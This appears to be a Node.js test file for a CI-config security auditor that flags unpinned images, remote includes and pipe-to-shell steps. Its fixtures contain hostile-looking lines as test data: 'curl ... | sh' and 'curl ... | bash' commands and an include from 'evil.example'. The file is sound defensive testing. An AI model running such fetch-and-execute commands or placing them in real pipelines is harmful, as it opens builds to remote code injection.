import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { auditCiYaml, runCiAudit } from "./ci-audit.js";

describe("auditCiYaml — image pinning", () => {
  it("flags :latest and untagged images, not version- or digest-pinned ones", () => {
    const yml = [
      "image: node:latest", // mutable tag → flag
      "build:",
      "  image: python", // no tag → flag
      "  services:",
      "    - name: postgres:16.2", // concrete version → ok
      "    - name: redis@sha256:" + "a".repeat(64), // digest → ok
    ].join("\n");
    const findings = auditCiYaml(yml, ".gitlab-ci.yml");
    const names = findings.map((f) => f.name);
    assert.ok(
      names.some((n) => n.includes("node:latest")),
      "should flag :latest",
    );
    assert.ok(
      names.some((n) => n.includes("unpinned image python")),
      "should flag untagged",
    );
    assert.ok(!names.some((n) => n.includes("postgres")), "version tag must be exempt");
    assert.ok(!names.some((n) => n.includes("redis")), "digest pin must be exempt");
    const latest = findings.find((f) => f.name.includes("node:latest"));
    assert.equal(latest?.rule?.id, "CWE-1104");
    assert.equal(latest?.severity, "medium");
  });

  it("does NOT flag a bare `name:` label (Bitbucket step / job name, not an image)", () => {
    const yml = [
      "image: node:20.11.1",
      "pipelines:",
      "  default:",
      "    - step:",
      "        name: kit ci", // a step label — not an image
      "        script:",
      "          - npx --yes sandstream-kit ci",
    ].join("\n");
    const findings = auditCiYaml(yml, "bitbucket-pipelines.yml");
    assert.ok(
      !findings.some((f) => f.name.includes("kit")),
      "a step `name:` label must not be reported as an unpinned image",
    );
  });

  it("does not double-report the same unpinned image", () => {
    const yml = "image: node:latest\nother:\n  image: node:latest\n";
    const findings = auditCiYaml(yml, ".gitlab-ci.yml").filter((f) => f.name.includes("node"));
    assert.equal(findings.length, 1);
  });
});

describe("auditCiYaml — remote include (GitLab)", () => {
  it("flags an include from an external URL", () => {
    const yml = "include:\n  - remote: 'https://evil.example/ci.yml'\n";
    const findings = auditCiYaml(yml, ".gitlab-ci.yml");
    const hit = findings.find((f) => f.name.startsWith("remote CI include"));
    assert.ok(hit);
    assert.equal(hit?.rule?.id, "OWASP-A08");
    assert.match(hit?.detail ?? "", /evil\.example/);
  });
});

describe("auditCiYaml — pipe-to-shell", () => {
  it("flags curl | sh inside a script step", () => {
    const yml = "script:\n  - curl https://get.example.sh | sh\n";
    const findings = auditCiYaml(yml, "bitbucket-pipelines.yml");
    const hit = findings.find((f) => f.name.startsWith("pipe-to-shell"));
    assert.ok(hit);
    assert.equal(hit?.rule?.id, "CWE-494");
  });

  it("clean CI → no findings", () => {
    const yml = "image: node:20.11.1\nscript:\n  - npm ci\n  - npm test\n";
    assert.deepEqual(auditCiYaml(yml, ".gitlab-ci.yml"), []);
  });
});

describe("runCiAudit", () => {
  it("skips when neither CI file exists", () => {
    const dir = mkdtempSync(join(tmpdir(), "kit-ci-none-"));
    try {
      const results = runCiAudit(dir);
      assert.equal(results.length, 1);
      assert.equal(results[0].status, "skip");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("passes when CI files are clean", () => {
    const dir = mkdtempSync(join(tmpdir(), "kit-ci-clean-"));
    try {
      writeFileSync(join(dir, ".gitlab-ci.yml"), "image: node:20.11.1\nscript:\n  - npm ci\n");
      const results = runCiAudit(dir);
      assert.equal(results.length, 1);
      assert.equal(results[0].status, "pass");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("reports findings from a risky CI file", () => {
    const dir = mkdtempSync(join(tmpdir(), "kit-ci-risky-"));
    try {
      writeFileSync(
        join(dir, "bitbucket-pipelines.yml"),
        "image: node:latest\nscript:\n  - curl https://x.sh | bash\n",
      );
      const results = runCiAudit(dir);
      assert.ok(results.length >= 2);
      assert.ok(results.every((r) => r.status !== "skip"));
      assert.ok(results.some((r) => r.name.includes("node:latest")));
      assert.ok(results.some((r) => r.name.startsWith("pipe-to-shell")));
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});
